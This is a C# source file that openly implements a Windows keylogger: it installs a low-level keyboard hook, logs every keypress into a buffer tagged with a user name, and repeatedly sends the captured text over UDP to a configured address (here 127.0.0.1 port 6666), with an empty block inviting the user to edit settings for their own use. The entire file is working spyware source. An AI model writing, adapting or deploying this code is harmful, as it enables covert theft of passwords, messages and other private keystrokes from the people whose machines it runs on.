using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Text;

using static System.Net.Mime.MediaTypeNames;

namespace Keylog { 

	
    public class Keylog_exe
	{
        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
        
        
    // ----------------------------- END -------------------------------- //

        public static string user_name;
        private static int WH_KEYBOARD_LL;
        private static int WM_KEYDOWN ;
        private static IntPtr hook;
        public static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";
        

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public Keylog_exe(string name)
        {
            user_name = name;
            WH_KEYBOARD_LL = 13;
            WM_KEYDOWN = 0x0100;
            hook = IntPtr.Zero;
            buffer = name+";";
            
        }


        static int getLenght_byte(byte[] b)
        {
            int a  = 0;
            foreach(byte elem in b)
            {
                a++;
            }
            return a;
        }

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            string name = user_name;

            if(buffer.Length >= 50 + name.Length)
            {
                /* envoie du fichier*/
                UdpClient client  = new UdpClient();
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse("127.0.0.1"),6666);
                client.Connect(ep);
                byte[] b = Encoding.ASCII.GetBytes(buffer);
                client.Send(b,getLenght_byte(b));
                /*------------------*/

               
                buffer = name+";";
            }
            





            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        

        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

    }
}